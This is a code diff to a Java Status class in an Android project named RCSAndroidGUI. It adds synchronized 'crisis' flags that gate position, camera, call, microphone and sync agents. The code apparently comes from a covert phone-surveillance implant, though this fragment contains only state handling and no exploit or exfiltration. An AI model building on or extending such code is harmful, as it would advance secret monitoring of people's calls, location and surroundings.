@@ -11,9 +11,12 @@ import java.util.ArrayList;
 import java.util.HashMap;
 
 import android.content.Context;
+import android.util.Log;
 
 import com.ht.RCSAndroidGUI.action.Action;
+import com.ht.RCSAndroidGUI.agent.AgentBase;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
+import com.ht.RCSAndroidGUI.agent.CrisisAgent;
 import com.ht.RCSAndroidGUI.conf.Option;
 import com.ht.RCSAndroidGUI.event.EventConf;
 import com.ht.RCSAndroidGUI.utils.Check;
@@ -24,6 +27,8 @@ import com.ht.RCSAndroidGUI.utils.Check;
  * The Class Status.
  */
 public class Status {
+
+	private static final String TAG = "Status";
 
 	/** The agents map. */
 	private final HashMap<Integer, AgentConf> agentsMap;
@@ -48,6 +53,10 @@ public class Status {
 
 	/** The context. */
 	private static Context context;
+
+	Object lockCrisis = new Object();
+	private boolean crisis = false;
+	private int crisisType;
 
 	/**
 	 * Instantiates a new status.
@@ -101,8 +110,9 @@ public class Status {
 
 	/**
 	 * Sets the app context.
-	 *
-	 * @param context the new app context
+	 * 
+	 * @param context
+	 *            the new app context
 	 */
 	public static void setAppContext(final Context context) {
 		Check.requires(context != null, "Null Context");
@@ -337,16 +347,6 @@ public class Status {
 	}
 
 	/**
-	 * Crisis sync.
-	 * 
-	 * @return true, if successful
-	 */
-	public boolean crisisSync() {
-		// TODO Auto-generated method stub
-		return false;
-	}
-
-	/**
 	 * Backlight.
 	 * 
 	 * @return true, if successful
@@ -419,5 +419,63 @@ public class Status {
 	public void setRestarting(final boolean b) {
 		// TODO Auto-generated method stub
 
+	}
+
+	public synchronized void setCrisis(int type) {
+
+		synchronized (lockCrisis) {
+			crisisType = type;
+		}
+
+		Log.d(TAG, "setCrisis: " + type);
+
+		AgentConf agent;
+		try {
+			agent = getAgent(AgentConf.AGENT_MIC);
+			if (agent != null) {
+				// final MicAgent micAgent = (MicAgent) agent;
+				// micAgent.crisis(crisisMic());
+			}
+		} catch (RCSException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+
+	}
+
+	private boolean isCrisis() {
+		synchronized (lockCrisis) {
+			return crisis;
+		}
+	}
+
+	public boolean crisisPosition() {
+		synchronized (lockCrisis) {
+			return (isCrisis() && (crisisType & CrisisAgent.POSITION) != 0);
+		}
+	}
+
+	public boolean crisisCamera() {
+		synchronized (lockCrisis) {
+			return (isCrisis() && (crisisType & CrisisAgent.CAMERA) != 0);
+		}
+	}
+
+	public boolean crisisCall() {
+		synchronized (lockCrisis) {
+			return (isCrisis() && (crisisType & CrisisAgent.CALL) != 0);
+		}
+	}
+
+	public boolean crisisMic() {
+		synchronized (lockCrisis) {
+			return (isCrisis() && (crisisType & CrisisAgent.MIC) != 0);
+		}
+	}
+
+	public boolean crisisSync() {
+		synchronized (lockCrisis) {
+			return (isCrisis() && (crisisType & CrisisAgent.SYNC) != 0);
+		}
 	}
 }
